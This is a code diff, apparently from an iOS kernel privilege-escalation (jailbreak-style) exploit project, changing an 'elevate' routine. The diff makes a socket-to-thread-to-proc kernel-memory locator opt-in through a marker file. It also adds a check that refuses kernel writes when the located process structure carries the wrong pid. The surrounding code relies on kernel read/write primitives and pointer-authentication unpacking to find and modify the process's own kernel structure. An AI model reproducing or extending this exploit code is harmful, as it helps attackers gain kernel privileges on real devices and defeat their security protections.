@@ -107,10 +107,17 @@ static uint64_t el_unpac(uint64_t v) {
         /* 22G100 socket ladder first: the ClearSword lane already holds the
            rw inpcb KVA. pcb -> socket.so_background_thread -> thread.t_ro ->
            thread_ro.proc (AGX-RW-iOS-PoC 22G100). */
-        if (Lum1naCS2Core_IsLive()) {
+        /* The 22G100 ladder was proven on A18; on A13/A14 the thread/socket
+           layout may differ. Default OFF: kobject validates pid+proc_ro.
+           Enable with Documents/lum1na_socket_locator once a receipt exists. */
+        NSString *docs = NSSearchPathForDirectoriesInDomains(
+            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+        BOOL socketLocator = docs && [[NSFileManager defaultManager]
+            fileExistsAtPath:[docs stringByAppendingPathComponent:@"lum1na_socket_locator"]];
+        if (socketLocator && Lum1naCS2Core_IsLive()) {
             uint64_t pcb = Lum1naCS2Core_RwSocketPcb();
             if (pcb && po->socket_so_background_thread) {
-                el_log(s, @"cs2 lane: socket→thread→proc locator (22G100 ladder)");
+                el_log(s, @"cs2 lane: socket→thread→proc locator (opt-in)");
                 selfp = Lum1naFindSelfProcViaSocket(po, (uint32_t)mypid, pcb, &how);
                 el_log(s, @"socket locator: %@", how ?: @"?");
             }
@@ -165,6 +172,15 @@ static uint64_t el_unpac(uint64_t v) {
             return s;
         }
         el_ok(s, @"proc_self = 0x%llx (pid %d)", (unsigned long long)selfp, mypid);
+    }
+
+    /* Never write through a locator result that is not our pid. */
+    if (selfp && el_kread32(selfp + po->proc_pid) != (uint32_t)mypid) {
+        el_bad(s, @"elevate HOLD - locator returned proc 0x%llx with wrong pid",
+               (unsigned long long)selfp);
+        [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold"
+                                   detail:@"locator-pid-mismatch" source:@"elevate"];
+        return s;
     }
 
     /* Read-only 22G100 traversal receipt: proc_ro -> task -> vm_map -> pmap.
